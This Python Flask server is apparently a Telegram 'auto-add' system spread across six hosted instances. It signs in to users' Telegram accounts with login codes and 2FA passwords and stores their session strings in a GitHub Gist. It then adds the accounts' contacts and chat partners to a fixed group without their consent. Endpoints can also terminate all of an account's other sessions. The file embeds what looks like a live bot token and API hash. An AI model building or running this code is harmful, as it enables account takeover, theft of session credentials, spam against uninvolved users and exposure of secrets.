#!/usr/bin/env python3
"""
Telegram Auto-Add Server - Multi-Server Comparison System
Uses GitHub Gist for free cloud storage
Auto-joins target group when adding accounts
"""

import os
import json
import time
import threading
import logging
import random
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests

# Telethon imports
from telethon import TelegramClient, events, functions, types
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, FloodWaitError, UserPrivacyRestrictedError,
    UserNotMutualContactError, ChatAdminRequiredError
)
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest, ResolveUsernameRequest
from telethon.tl.types import InputPeerUser, InputPeerChannel, InputPeerChat

# ============================================
# ⚙️ CONFIGURATION - CHANGE ONLY SERVER_NUMBER ⚙️
# ============================================

# 🔴 CHANGE THIS NUMBER FOR EACH SERVER (1-6)
SERVER_NUMBER = 1

# GitHub Gist Configuration
GIST_ID = 'aac47a951404eec34ad7faf181049dc2'
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', 'YOUR_TOKEN_HERE')

# Server configurations for all 6 servers
SERVERS = {
    1: {
        'name': 'Admin1',
        'api_id': 33465589,
        'api_hash': '08bdab35790bf1fdf20c16a50bd323b8',
        'url': 'https://auto-add-server-1.onrender.com'
    },
    2: {
        'name': 'Admin2',
        'api_id': 12345678,
        'api_hash': 'your_second_api_hash_here',
        'url': 'https://auto-add-server-2.onrender.com'
    },
    3: {
        'name': 'Admin3',
        'api_id': 12345678,
        'api_hash': 'your_third_api_hash_here',
        'url': 'https://auto-add-server-3.onrender.com'
    },
    4: {
        'name': 'Admin4',
        'api_id': 12345678,
        'api_hash': 'your_fourth_api_hash_here',
        'url': 'https://auto-add-server-4.onrender.com'
    },
    5: {
        'name': 'Admin5',
        'api_id': 12345678,
        'api_hash': 'your_fifth_api_hash_here',
        'url': 'https://auto-add-server-5.onrender.com'
    },
    6: {
        'name': 'Admin6',
        'api_id': 12345678,
        'api_hash': 'your_sixth_api_hash_here',
        'url': 'https://auto-add-server-6.onrender.com'
    }
}

# Telegram Bot for Reports
BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
REPORT_CHAT_ID = '-1002452548749'

# Target group for auto-add
TARGET_GROUP = 'Abe_armygroup'

# ============================================
# AUTO-DETECT SERVER CONFIG
# ============================================

SERVER_CONFIG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_ADMIN_NAME = SERVER_CONFIG['name']
API_ID = SERVER_CONFIG['api_id']
API_HASH = SERVER_CONFIG['api_hash']
SERVER_URL = SERVER_CONFIG['url']

OTHER_SERVERS = [
    {'name': SERVERS[i]['name'], 'url': SERVERS[i]['url']} 
    for i in SERVERS if i != SERVER_NUMBER
]

PORT = int(os.environ.get('PORT', 10000))

app = Flask(__name__)
CORS(app)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ============================================
# GITHUB GIST STORAGE
# ============================================

class GistStorage:
    """Free cloud storage using GitHub Gist"""
    
    def __init__(self, gist_id, token):
        self.gist_id = gist_id
        self.token = token
        self.base_url = f'https://api.github.com/gists/{gist_id}'
        self.headers = {
            'Authorization': f'token {token}',
            'Accept': 'application/vnd.github.v3+json'
        }
        self.cache = {}
        self.lock = threading.Lock()
        self.last_save = 0
    
    def load(self):
        """Load data from Gist"""
        try:
            resp = requests.get(self.base_url, headers=self.headers, timeout=10)
            if resp.status_code == 200:
                gist = resp.json()
                files = gist.get('files', {})
                
                data = {}
                for filename in files:
                    content = files[filename].get('content', '{}')
                    try:
                        data[filename] = json.loads(content)
                    except:
                        data[filename] = content
                
                self.cache = data
                logger.info(f"📥 Loaded from Gist: {list(data.keys())}")
                return data
            else:
                logger.error(f"Gist load failed: {resp.status_code}")
                return self.cache or {}
        except Exception as e:
            logger.error(f"Gist load error: {e}")
            return self.cache or {}
    
    def save(self, data_dict):
        """Save data to Gist"""
        now = time.time()
        if now - self.last_save < 30:
            self.cache.update(data_dict)
            return True
        
        self.last_save = now
        
        try:
            files = {}
            for key, value in data_dict.items():
                content = json.dumps(value, indent=2, default=str)
                files[key] = {'content': content}
            
            payload = {'files': files}
            resp = requests.patch(self.base_url, headers=self.headers, json=payload, timeout=15)
            
            if resp.status_code in [200, 201]:
                self.cache.update(data_dict)
                logger.debug(f"💾 Saved to Gist: {list(data_dict.keys())}")
                return True
            else:
                logger.error(f"Gist save failed: {resp.status_code}")
                return False
        except Exception as e:
            logger.error(f"Gist save error: {e}")
            return False
    
    def get(self, key, default=None):
        return self.cache.get(key, default)

# Initialize storage
storage = GistStorage(GIST_ID, GITHUB_TOKEN)

# ============================================
# DATA STORE
# ============================================

class DataStore:
    def __init__(self):
        self.accounts = []
        self.settings = {}
        self.stats = self._default_stats()
        self.history = []
        self.reports = {'last_report': None, 'reports': []}
        self.clients = {}
        self.lock = threading.Lock()
        self._load_all()
    
    def _default_stats(self):
        return {
            'server_name': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'total_added': 0,
            'today_added': 0,
            'last_reset_date': datetime.now().strftime('%Y-%m-%d'),
            'daily_history': {},
            'target_group': TARGET_GROUP,
            'started_at': datetime.now().isoformat()
        }
    
    def _load_all(self):
        data = storage.load()
        self.accounts = data.get('accounts.json', [])
        self.settings = data.get('auto_add_settings.json', {})
        self.stats = data.get('stats.json', self._default_stats())
        self.history = data.get('add_history.json', [])
        self.reports = data.get('reports.json', {'last_report': None, 'reports': []})
        logger.info(f"Loaded: {len(self.accounts)} accounts, {len(self.history)} history records")
    
    def save_all(self, immediate=False):
        with self.lock:
            data = {
                'accounts.json': self.accounts,
                'auto_add_settings.json': self.settings,
                'stats.json': self.stats,
                'add_history.json': self.history[-500:],
                'reports.json': self.reports
            }
            if immediate:
                storage.save(data)
            else:
                threading.Thread(target=storage.save, args=(data,), daemon=True).start()
    
    def reset_daily_if_needed(self):
        today = datetime.now().strftime('%Y-%m-%d')
        if self.stats.get('last_reset_date') != today:
            yesterday = self.stats.get('last_reset_date', today)
            self.stats['daily_history'][yesterday] = self.stats.get('today_added', 0)
            self.stats['today_added'] = 0
            self.stats['last_reset_date'] = today
            self.save_all(immediate=True)
            return True
        return False
    
    def add_to_today(self, count=1):
        self.reset_daily_if_needed()
        self.stats['today_added'] = self.stats.get('today_added', 0) + count
        self.stats['total_added'] = self.stats.get('total_added', 0) + count
    
    def log_add(self, account_id, user_id, username, source, success=True):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'server': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'account_id': account_id,
            'user_id': user_id,
            'username': username,
            'source': source,
            'success': success
        }
        self.history.append(entry)
        if success:
            self.add_to_today()
        if len(self.history) % 10 == 0:
            self.save_all()

store = DataStore()

# ============================================
# TELEGRAM BOT FUNCTIONS
# ============================================

def send_telegram_message(text, parse_mode='HTML'):
    """Send message to Telegram report chat"""
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        payload = {
            'chat_id': REPORT_CHAT_ID,
            'text': text,
            'parse_mode': parse_mode,
            'disable_web_page_preview': True
        }
        response = requests.post(url, json=payload, timeout=15)
        result = response.json()
        if not result.get('ok'):
            logger.error(f"Telegram API error: {result}")
        return result
    except Exception as e:
        logger.error(f"Error sending Telegram message: {e}")
        return None

def fetch_server_stats(server_url):
    """Fetch stats from another server"""
    try:
        resp = requests.get(f"{server_url}/api/public-stats", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('success'):
                return data['stats']
    except:
        pass
    return None

def generate_daily_report():
    """Generate daily comparison report"""
    store.reset_daily_if_needed()
    
    our_stats = {
        'name': SERVER_ADMIN_NAME,
        'server_number': SERVER_NUMBER,
        'today': store.stats.get('today_added', 0),
        'total': store.stats.get('total_added', 0),
        'active_accounts': len([a for a in store.accounts if a.get('active', True)]),
        'target_group': TARGET_GROUP
    }
    
    all_stats = [our_stats]
    failed_servers = []
    
    for server in OTHER_SERVERS:
        stats = fetch_server_stats(server['url'])
        if stats:
            all_stats.append(stats)
        else:
            failed_servers.append(server['name'])
            all_stats.append({'name': server['name'], 'today': 0, 'total': 0, 'error': True})
    
    total_today = sum(s.get('today', 0) for s in all_stats)
    total_all_time = sum(s.get('total', 0) for s in all_stats)
    active_servers = len([s for s in all_stats if not s.get('error')])
    all_stats.sort(key=lambda x: x.get('today', 0), reverse=True)
    
    current_date = datetime.now().strftime('%Y-%m-%d')
    current_time = datetime.now().strftime('%H:%M UTC')
    
    report = f"""
📊 <b>DAILY AUTO-ADD REPORT</b>
📅 <b>{current_date}</b> | 🕐 <b>{current_time}</b>
━━━━━━━━━━━━━━━━━━━━━━
🏆 <b>SERVER RANKINGS</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
    
    for i, stats in enumerate(all_stats, 1):
        name = stats.get('name', f'Server {i}')
        today = stats.get('today', 0)
        total = stats.get('total', 0)
        error = stats.get('error', False)
        percentage = (today / total_today * 100) if total_today > 0 else 0
        
        medal = '🥇' if i == 1 else ('🥈' if i == 2 else ('🥉' if i == 3 else f'{i}️⃣'))
        status = '⚠️ OFFLINE' if error else '✅ ONLINE'
        bar_length = max(1, int(percentage / 5)) if percentage > 0 else 0
        bar = '█' * bar_length + '░' * (20 - bar_length)
        
        report += f"""
{medal} <b>{name}</b> [{status}]
   {bar} <b>{today:,}</b> ({percentage:.1f}%)
   📅 Today: <b>{today:,}</b> users
   📊 Total: <b>{total:,}</b> users
"""
    
    report += f"""
━━━━━━━━━━━━━━━━━━━━━━
📈 <b>SUMMARY STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━
• 🌐 Active Servers: <b>{active_servers}/{len(all_stats)}</b>
• 📥 Total Added Today: <b>{total_today:,}</b> users
• 📊 Total All-Time: <b>{total_all_time:,}</b> users
• 📈 Average Per Server: <b>{total_today // max(active_servers, 1):,}</b> users
• 👑 Top Performer: <b>{all_stats[0]['name']}</b> ({all_stats[0].get('today', 0):,} users)

━━━━━━━━━━━━━━━━━━━━━━
🤖 <i>Generated by {SERVER_ADMIN_NAME}</i>
"""
    
    if failed_servers:
        report += f"\n⚠️ <b>Offline:</b> {', '.join(failed_servers)}"
    
    return report

def send_daily_report():
    try:
        logger.info(f"[{SERVER_ADMIN_NAME}] Generating daily report...")
        report = generate_daily_report()
        store.reports['reports'].append({
            'timestamp': datetime.now().isoformat(),
            'text': report[:300]
        })
        store.reports['last_report'] = datetime.now().isoformat()
        store.save_all(immediate=True)
        result = send_telegram_message(report)
        return result and result.get('ok')
    except Exception as e:
        logger.error(f"Error sending report: {e}")
        return False

# ============================================
# AUTO-ADD ENGINE (WITH AUTO-JOIN)
# ============================================

class AutoAddEngine:
    def __init__(self):
        self.running = {}
        self.threads = {}
        self.added_users = {}
        self.joined_groups = set()
    
    def start_for_account(self, account_id):
        if account_id in self.running and self.running[account_id]:
            return False, "Already running"
        
        settings = store.settings.get(str(account_id), {})
        if not settings.get('enabled'):
            return False, "Auto-add not enabled"
        
        account = next((a for a in store.accounts if a['id'] == account_id), None)
        if not account:
            return False, "Account not found"
        
        client = store.clients.get(account_id)
        if not client:
            return False, "Account not connected"
        
        self.running[account_id] = True
        if account_id not in self.added_users:
            self.added_users[account_id] = set()
        
        thread = threading.Thread(
            target=self._auto_add_loop,
            args=(account_id, client, settings),
            daemon=True
        )
        thread.start()
        self.threads[account_id] = thread
        
        return True, "Auto-add started"
    
    def stop_for_account(self, account_id):
        self.running[account_id] = False
        return True, "Auto-add stopped"
    
    def _auto_join_group(self, client, group_username, account_id):
        """Auto-join the target group"""
        cache_key = f"{account_id}_{group_username}"
        if cache_key in self.joined_groups:
            return True
        
        try:
            logger.info(f"[AutoAdd] Joining @{group_username} with account {account_id}...")
            entity = client.loop.run_until_complete(
                client.get_entity(f'@{group_username}')
            )
            client.loop.run_until_complete(
                client(JoinChannelRequest(entity))
            )
            self.joined_groups.add(cache_key)
            logger.info(f"[AutoAdd] ✅ Successfully joined @{group_username}")
            return True
        except FloodWaitError as e:
            logger.warning(f"[AutoAdd] Flood wait joining group: {e.seconds}s")
            time.sleep(e.seconds + 5)
            return self._auto_join_group(client, group_username, account_id)
        except Exception as e:
            error_msg = str(e)
            if 'already' in error_msg.lower() or 'participant' in error_msg.lower():
                self.joined_groups.add(cache_key)
                logger.info(f"[AutoAdd] Already in @{group_username}")
                return True
            logger.error(f"[AutoAdd] Failed to join @{group_username}: {e}")
            return False
    
    def _auto_add_loop(self, account_id, client, settings):
        target_group = settings.get('target_group', TARGET_GROUP)
        delay = max(25, settings.get('delay_seconds', 25))
        auto_join = settings.get('auto_join', True)
        
        logger.info(f"[AutoAdd] Starting {SERVER_ADMIN_NAME} account {account_id} -> @{target_group}")
        
        # AUTO-JOIN TARGET GROUP FIRST
        if auto_join:
            joined = self._auto_join_group(client, target_group, account_id)
            if not joined:
                logger.error(f"[AutoAdd] Could not join @{target_group}. Continuing anyway...")
        
        added_users = self.added_users.get(account_id, set())
        consecutive_failures = 0
        add_count = 0
        
        while self.running.get(account_id):
            try:
                store.reset_daily_if_needed()
                
                # Re-join periodically to ensure membership
                if auto_join and add_count % 100 == 0 and add_count > 0:
                    self._auto_join_group(client, target_group, account_id)
                
                new_members = self._find_members(client, added_users)
                
                if not new_members:
                    consecutive_failures += 1
                    if consecutive_failures > 5:
                        added_users.clear()
                        consecutive_failures = 0
                        logger.info(f"[AutoAdd] Cleared user cache, searching fresh")
                    time.sleep(delay * 2)
                    continue
                
                consecutive_failures = 0
                
                for member in new_members[:3]:
                    if not self.running.get(account_id):
                        break
                    
                    user_id = member['id']
                    if user_id in added_users:
                        continue
                    
                    try:
                        success = client.loop.run_until_complete(
                            self._add_user_to_group(client, target_group, user_id)
                        )
                        
                        if success:
                            added_users.add(user_id)
                            add_count += 1
                            store.log_add(
                                account_id, user_id,
                                member.get('username', ''),
                                member.get('source', 'unknown')
                            )
                            logger.info(f"[{SERVER_ADMIN_NAME}] +{add_count} Added user {user_id} ({member.get('source')})")
                            
                            if add_count % 50 == 0:
                                send_telegram_message(f"""
📊 <b>Progress - {SERVER_ADMIN_NAME}</b>
✅ Added {add_count} in session
📥 Today: {store.stats.get('today_added', 0):,}
📊 Total: {store.stats.get('total_added', 0):,}
🎯 @{target_group}
""")
                        
                        time.sleep(delay)
                        
                    except FloodWaitError as e:
                        logger.warning(f"[AutoAdd] Flood wait: {e.seconds}s")
                        time.sleep(e.seconds + 10)
                    except Exception as e:
                        logger.error(f"[AutoAdd] Error: {e}")
                        time.sleep(delay)
                
            except Exception as e:
                logger.error(f"[AutoAdd] Loop error: {e}")
                time.sleep(delay * 2)
        
        logger.info(f"[AutoAdd] Stopped account {account_id}. Total added: {add_count}")
    
    def _find_members(self, client, exclude_users):
        members = []
        try:
            # Get from contacts
            try:
                contacts = client.loop.run_until_complete(client(GetContactsRequest(hash=0)))
                for contact in contacts.contacts[:100]:
                    if contact.id not in exclude_users and not getattr(contact, 'bot', False):
                        members.append({
                            'id': contact.id,
                            'username': getattr(contact, 'username', ''),
                            'source': 'contacts'
                        })
            except:
                pass
            
            # Get from recent dialogs
            try:
                dialogs = client.loop.run_until_complete(client.get_dialogs(limit=200))
                for dialog in dialogs:
                    if dialog.is_user and not getattr(dialog.entity, 'bot', False):
                        if dialog.entity.id not in exclude_users and len(members) < 200:
                            members.append({
                                'id': dialog.entity.id,
                                'username': getattr(dialog.entity, 'username', ''),
                                'source': 'dialogs'
                            })
            except:
                pass
            
            random.shuffle(members)
        except Exception as e:
            logger.error(f"[AutoAdd] Find members error: {e}")
        
        return members
    
    async def _add_user_to_group(self, client, group_username, user_id):
        try:
            group = await client.get_entity(f'@{group_username}')
            user = await client.get_entity(user_id)
            
            if isinstance(group, types.Channel):
                await client(InviteToChannelRequest(channel=group, users=[user]))
            else:
                await client(functions.messages.AddChatUserRequest(
                    chat_id=group.id, user_id=user.id, fwd_limit=100
                ))
            return True
        except UserPrivacyRestrictedError:
            return False
        except UserNotMutualContactError:
            return False
        except FloodWaitError as e:
            raise
        except Exception as e:
            logger.debug(f"Add error for {user_id}: {e}")
            return False

auto_add_engine = AutoAddEngine()

# ============================================
# FLASK API ROUTES
# ============================================

@app.route('/')
@app.route('/auto-add')
def index():
    return send_from_directory('.', 'auto_add.html')

@app.route('/dashboard')
def dashboard():
    if os.path.exists('fog.html'):
        return send_from_directory('.', 'fog.html')
    return send_from_directory('.', 'auto_add.html')

@app.route('/dash')
def dash():
    if os.path.exists('dash.html'):
        return send_from_directory('.', 'dash.html')
    return send_from_directory('.', 'auto_add.html')

@app.route('/all')
def devices():
    if os.path.exists('all.html'):
        return send_from_directory('.', 'all.html')
    return send_from_directory('.', 'auto_add.html')

@app.route('/login')
def login():
    if os.path.exists('login.html'):
        return send_from_directory('.', 'login.html')
    return send_from_directory('.', 'auto_add.html')

@app.route('/<path:path>')
def serve_static(path):
    if os.path.exists(path):
        return send_from_directory('.', path)
    return send_from_directory('.', 'auto_add.html')

@app.route('/ping')
@app.route('/api/health')
def health_check():
    store.reset_daily_if_needed()
    return jsonify({
        'status': 'ok',
        'server_name': SERVER_ADMIN_NAME,
        'server_number': SERVER_NUMBER,
        'timestamp': datetime.now().isoformat(),
        'accounts': len(store.accounts),
        'today_added': store.stats.get('today_added', 0),
        'total_added': store.stats.get('total_added', 0),
        'storage': 'github_gist'
    })

@app.route('/api/public-stats')
def public_stats():
    store.reset_daily_if_needed()
    return jsonify({
        'success': True,
        'stats': {
            'name': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'today': store.stats.get('today_added', 0),
            'total': store.stats.get('total_added', 0),
            'active_accounts': len([a for a in store.accounts if a.get('active', True)]),
            'target_group': TARGET_GROUP,
            'last_updated': datetime.now().isoformat(),
            'url': SERVER_URL
        }
    })

@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_ADMIN_NAME,
            'url': SERVER_URL,
            'target_group': TARGET_GROUP,
            'total_servers': len(SERVERS),
            'other_servers': OTHER_SERVERS,
            'storage': 'github_gist'
        }
    })

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
        if not phone.startswith('+'):
            phone = '+' + phone
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.connect()
        result = client.send_code_request(phone)
        
        session_id = str(int(time.time() * 1000))
        
        if not hasattr(app, 'temp_sessions'):
            app.temp_sessions = {}
        app.temp_sessions[session_id] = {
            'session_id': session_id,
            'phone': phone,
            'phone_code_hash': result.phone_code_hash,
            'client': client,
            'target_group': TARGET_GROUP
        }
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': f'Code sent to {phone}'
        })
    except Exception as e:
        logger.error(f"Error adding account: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        session_id = data.get('session_id', '')
        password = data.get('password', '')
        
        if not hasattr(app, 'temp_sessions') or session_id not in app.temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please try again.'})
        
        temp = app.temp_sessions[session_id]
        client = temp['client']
        phone = temp['phone']
        target_group = temp.get('target_group', TARGET_GROUP)
        
        try:
            client.sign_in(phone=phone, code=code, phone_code_hash=temp['phone_code_hash'])
        except SessionPasswordNeededError:
            if not password:
                return jsonify({'success': False, 'need_password': True, 'message': '2FA password required'})
            try:
                client.sign_in(password=password)
            except Exception as e:
                return jsonify({'success': False, 'error': f'Invalid 2FA password: {str(e)}'})
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
        
        me = client.get_me()
        account_id = int(time.time() * 1000)
        
        # AUTO-JOIN TARGET GROUP after login
        join_status = "Not attempted"
        try:
            logger.info(f"Auto-joining @{target_group} for new account...")
            entity = client.get_entity(f'@{target_group}')
            client(JoinChannelRequest(entity))
            join_status = "Successfully joined"
            logger.info(f"✅ New account joined @{target_group}")
        except Exception as e:
            error_msg = str(e)
            if 'already' in error_msg.lower() or 'participant' in error_msg.lower():
                join_status = "Already a member"
            else:
                join_status = f"Join failed: {error_msg[:50]}"
            logger.warning(f"Auto-join result: {join_status}")
        
        account = {
            'id': account_id,
            'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or 'User',
            'phone': phone,
            'username': me.username or '',
            'session_string': client.session.save(),
            'active': True,
            'server': SERVER_ADMIN_NAME,
            'server_number': SERVER_NUMBER,
            'added_at': datetime.now().isoformat(),
            'auto_joined': join_status
        }
        
        store.accounts.append(account)
        store.clients[account_id] = client
        store.save_all(immediate=True)
        
        del app.temp_sessions[session_id]
        
        # Auto-enable auto-add for this account
        store.settings[str(account_id)] = {
            'enabled': True,
            'target_group': target_group,
            'delay_seconds': 25,
            'auto_join': True,
            'updated_at': datetime.now().isoformat(),
            'server': SERVER_ADMIN_NAME
        }
        store.save_all(immediate=True)
        
        # Start auto-add immediately
        auto_add_engine.start_for_account(account_id)
        
        return jsonify({
            'success': True,
            'account': {
                'id': account_id,
                'name': account['name'],
                'phone': account['phone']
            },
            'join_status': join_status,
            'auto_add_started': True
        })
    except Exception as e:
        logger.error(f"Error verifying code: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/accounts')
def get_accounts():
    return jsonify({
        'success': True,
        'accounts': [{
            'id': a['id'],
            'name': a['name'],
            'phone': a['phone'],
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'server': SERVER_ADMIN_NAME,
            'auto_add_enabled': store.settings.get(str(a['id']), {}).get('enabled', False),
            'join_status': a.get('auto_joined', 'Unknown')
        } for a in store.accounts]
    })

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        store.accounts = [a for a in store.accounts if a['id'] != account_id]
        
        if account_id in store.clients:
            try:
                store.clients[account_id].disconnect()
            except:
                pass
            del store.clients[account_id]
        
        store.settings.pop(str(account_id), None)
        auto_add_engine.stop_for_account(account_id)
        store.save_all(immediate=True)
        
        return jsonify({'success': True, 'message': 'Account removed'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        client = store.clients.get(account_id)
        if not client:
            return jsonify({'success': False, 'error': 'Account not connected'})
        
        result = client(functions.account.GetAuthorizationsRequest())
        
        current_hash = None
        sessions = []
        
        for auth in result.authorizations:
            session_info = {
                'hash': str(auth.hash),
                'device_model': auth.device_model or 'Unknown',
                'platform': auth.platform or 'Unknown',
                'ip': auth.ip or '',
                'country': auth.country or '',
                'date_active': auth.date_active,
                'current': auth.current
            }
            if auth.current:
                current_hash = str(auth.hash)
            sessions.append(session_info)
        
        return jsonify({'success': True, 'sessions': sessions, 'current_hash': current_hash})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    try:
        data = request.json
        client = store.clients.get(data.get('accountId'))
        if not client:
            return jsonify({'success': False, 'error': 'Not connected'})
        
        client(functions.account.ResetAuthorizationRequest(hash=int(data.get('hash'))))
        return jsonify({'success': True, 'message': 'Session terminated'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    try:
        data = request.json
        client = store.clients.get(data.get('accountId'))
        if not client:
            return jsonify({'success': False, 'error': 'Not connected'})
        
        result = client(functions.account.GetAuthorizationsRequest())
        
        terminated = 0
        for auth in result.authorizations:
            if not auth.current:
                try:
                    client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                    terminated += 1
                except:
                    pass
        
        return jsonify({'success': True, 'message': f'Terminated {terminated} sessions'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings():
    if request.method == 'GET':
        account_id = request.args.get('accountId')
        settings = store.settings.get(str(account_id), {
            'enabled': False,
            'target_group': TARGET_GROUP,
            'delay_seconds': 25,
            'auto_join': True
        })
        settings['added_today'] = store.stats.get('today_added', 0)
        settings['total_added'] = store.stats.get('total_added', 0)
        settings['server_name'] = SERVER_ADMIN_NAME
        return jsonify({'success': True, 'settings': settings})
    
    else:
        try:
            data = request.json
            account_id = data.get('accountId')
            
            settings = {
                'enabled': data.get('enabled', False),
                'target_group': data.get('target_group', TARGET_GROUP),
                'delay_seconds': max(25, data.get('delay_seconds', 25)),
                'auto_join': data.get('auto_join', True),
                'updated_at': datetime.now().isoformat(),
                'server': SERVER_ADMIN_NAME
            }
            
            store.settings[str(account_id)] = settings
            store.save_all(immediate=True)
            
            if settings['enabled']:
                if account_id in store.clients:
                    auto_add_engine.start_for_account(account_id)
            else:
                auto_add_engine.stop_for_account(account_id)
            
            return jsonify({'success': True, 'message': 'Settings saved'})
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    store.reset_daily_if_needed()
    return jsonify({
        'success': True,
        'added_today': store.stats.get('today_added', 0),
        'total_added': store.stats.get('total_added', 0),
        'server_name': SERVER_ADMIN_NAME,
        'server_number': SERVER_NUMBER
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        client = store.clients.get(account_id)
        if not client:
            return jsonify({'success': False, 'error': 'Account not connected'})
        
        settings = store.settings.get(str(account_id), {})
        target_group = settings.get('target_group', TARGET_GROUP)
        
        # Test group access
        group_found = False
        group_title = target_group
        try:
            entity = client.get_entity(f'@{target_group}')
            group_found = True
            group_title = getattr(entity, 'title', target_group)
        except:
            pass
        
        # Count available members
        available = 0
        try:
            contacts = client(GetContactsRequest(hash=0))
            available += len([c for c in contacts.contacts if not getattr(c, 'bot', False)])
        except:
            pass
        
        try:
            dialogs = client.get_dialogs(limit=100)
            available += len([d for d in dialogs if d.is_user and not getattr(d.entity, 'bot', False)])
        except:
            pass
        
        return jsonify({
            'success': True,
            'group_found': group_found,
            'group_title': group_title,
            'available_members': available,
            'can_add_members': available > 0,
            'server_name': SERVER_ADMIN_NAME,
            'target_group': target_group
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/join-group', methods=['POST'])
def join_group():
    """Manually trigger join for target group"""
    try:
        data = request.json
        account_id = data.get('accountId')
        group = data.get('group', TARGET_GROUP)
        
        client = store.clients.get(account_id)
        if not client:
            return jsonify({'success': False, 'error': 'Account not connected'})
        
        try:
            entity = client.get_entity(f'@{group}')
            client(JoinChannelRequest(entity))
            return jsonify({'success': True, 'message': f'Joined @{group}'})
        except Exception as e:
            error_msg = str(e)
            if 'already' in error_msg.lower():
                return jsonify({'success': True, 'message': f'Already in @{group}'})
            return jsonify({'success': False, 'error': error_msg})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-report')
def trigger_report():
    success = send_daily_report()
    return jsonify({'success': success, 'message': 'Report sent' if success else 'Failed'})

# ============================================
# KEEP-ALIVE & SCHEDULERS
# ============================================

def keep_alive_ping():
    """Ping itself to prevent Render sleeping"""
    while True:
        time.sleep(600)
        try:
            requests.get(f"{SERVER_URL}/ping", timeout=10)
        except:
            pass

def daily_report_scheduler():
    """Send daily report at midnight UTC"""
    last_date = None
    while True:
        now = datetime.now()
        today = now.strftime('%Y-%m-%d')
        
        if (now.hour == 0 or now.hour == 1) and last_date != today:
            wait = random.randint(0, 1800)
            time.sleep(wait)
            store.reset_daily_if_needed()
            send_daily_report()
            last_date = today
        
        time.sleep(300)

def restore_sessions():
    """Restore saved sessions on startup"""
    restored = 0
    for account in store.accounts:
        if account.get('session_string'):
            try:
                client = TelegramClient(
                    StringSession(account['session_string']),
                    API_ID, API_HASH
                )
                client.connect()
                
                if client.is_user_authorized():
                    account_id = account['id']
                    store.clients[account_id] = client
                    account['active'] = True
                    restored += 1
                    
                    settings = store.settings.get(str(account_id), {})
                    if settings.get('enabled'):
                        auto_add_engine.start_for_account(account_id)
                else:
                    account['active'] = False
            except Exception as e:
                logger.error(f"Error restoring {account.get('name')}: {e}")
                account['active'] = False
    
    store.save_all()
    logger.info(f"[{SERVER_ADMIN_NAME}] Restored {restored} sessions")
    return restored

# ============================================
# MAIN
# ============================================

if __name__ == '__main__':
    print(f"""
╔══════════════════════════════════════╗
║  TELEGRAM AUTO-ADD SERVER           ║
╠══════════════════════════════════════╣
║  Server #{SERVER_NUMBER}: {SERVER_ADMIN_NAME}              ║
║  Storage: GitHub Gist (FREE)        ║
║  Target: @{TARGET_GROUP}           ║
║  Auto-Join: ENABLED                 ║
║  Port: {PORT}                        ║
╚══════════════════════════════════════╝
    """)
    
    restore_sessions()
    
    threading.Thread(target=keep_alive_ping, daemon=True).start()
    threading.Thread(target=daily_report_scheduler, daemon=True).start()
    
    send_telegram_message(f"""
🟢 <b>{SERVER_ADMIN_NAME} Online!</b>
🕐 {datetime.now().strftime('%Y-%m-%d %H:%M UTC')}
📋 Server #{SERVER_NUMBER}
🎯 Target: @{TARGET_GROUP}
👤 Accounts: {len(store.accounts)}
🔗 Auto-Join: ENABLED
💾 Storage: GitHub Gist
📊 Reports: AUTO (midnight UTC)
""")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
